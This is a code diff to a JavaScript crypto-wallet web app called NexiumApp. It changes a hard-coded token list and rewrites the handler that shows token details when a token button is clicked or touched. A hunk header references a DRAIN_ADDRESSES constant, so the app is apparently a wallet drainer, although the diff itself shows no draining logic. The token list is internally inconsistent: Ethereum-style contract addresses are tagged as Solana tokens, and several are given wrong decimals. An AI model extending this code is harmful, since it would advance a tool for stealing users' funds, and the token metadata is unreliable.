@@ -12,12 +12,12 @@ const DRAIN_ADDRESSES = {
 
 const TOKEN_LIST = [
   { address: "So11111111111111111111111111111111111111112", name: 'Solana', symbol: 'SOL', decimals: 9, isNative: true, chain: 'solana' },
-  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'BNB', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' },
-  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'MATIC', symbol: 'MATIC', decimals: 6, isNative: false, chain: 'solana' },
-  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'ETH', symbol: 'ETH', decimals: 6, isNative: false, chain: 'solana' },
-  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'BASE ETH', symbol: 'BASE ETH', decimals: 6, isNative: false, chain: 'solana' },
-  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'LINK', symbol: 'LINK', decimals: 6, isNative: false, chain: 'solana' },
   { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' },
+  { address: '0x0d505C03d30e65f6e4bC25069FCf067B3f621770', name: 'BNB', symbol: 'BNB', decimals: 6, isNative: false, chain: 'solana' },
+  { address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', name: 'MATIC', symbol: 'MATIC', decimals: 6, isNative: false, chain: 'solana' },
+  { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', name: 'ETH', symbol: 'ETH', decimals: 6, isNative: false, chain: 'solana' },
+  { address: '0x4200000000000000000000000000000000000006', name: 'BASE ETH', symbol: 'BASE ETH', decimals: 6, isNative: false, chain: 'solana' },
+  { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', name: 'LINK', symbol: 'LINK', decimals: 6, isNative: false, chain: 'solana' },
   { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Wrapped SOL', symbol: 'wSOL', decimals: 9, isNative: false, chain: 'solana' }
 ];
 
@@ -763,12 +763,29 @@ class NexiumApp {
     }
     if (this.dom.tokenList) {
       this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
-        const debouncedLoadToken = this.debounce(() => {
+        const showTokenInfo = () => {
           const address = button.dataset.address;
-          if (address) this.loadCustomTokenData(address);
-          else this.showFeedback('Invalid token address.', 'error');
-        }, 1000);
-        button.addEventListener('click', debouncedLoadToken);
+          if (!address) {
+            this.showFeedback('Invalid token address.', 'error');
+            return;
+          }
+          const token = TOKEN_LIST.find(t => t.address === address);
+          if (token) {
+            const truncatedAddress = this.shortenAddress(address);
+            this.dom.tokenInfo.innerHTML = `
+              <div class="token-meta space-y-2">
+                <h3 class="text-yellow-400 text-lg font-semibold">${this.escapeHTML(token.name)}</h3>
+                <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
+              </div>
+            `;
+            this.dom.tokenInfo.classList.remove('hidden');
+            this.loadCustomTokenData(address);
+          } else {
+            this.showFeedback('Token not found.', 'error');
+          }
+        };
+        button.addEventListener('click', showTokenInfo);
+        button.addEventListener('touchstart', showTokenInfo);
       });
     }
     if (this.dom.tokenSelect) {
@@ -810,7 +827,7 @@ class NexiumApp {
         symbol = tokenFromList.symbol;
         decimals = tokenFromList.decimals;
       } else {
-        this.showFeedback('SPL token data fetch not supported yet.', 'error');
+        this.showFeedback('Token not found in list.', 'error');
         return;
       }
       this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
